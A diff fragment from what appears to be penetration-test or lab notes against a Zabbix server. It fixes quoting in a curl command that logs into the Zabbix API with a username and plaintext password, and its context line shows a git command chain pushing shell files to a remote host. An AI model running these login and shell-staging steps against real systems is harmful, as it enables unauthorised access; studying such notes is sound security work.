@@ -179,7 +179,7 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 curl \
 --request POST "http://$TARGET/zabbix/api_jsonrpc.php" \
 --header 'Content-Type: application/json-rpc' \
---data '{"jsonrpc":"2.0","method":"user.login","params":{"username":"matthew","password":"96qzn0h2e1k3"},"id":1}
+--data '{"jsonrpc":"2.0","method":"user.login","params":{"username":"matthew","password":"96qzn0h2e1k3"},"id":1}'
 
 +---------- Set Auth Key ----------+
 AUTH_KEY=23b5c3d2e3c6a3ac6ec692ece555aad1
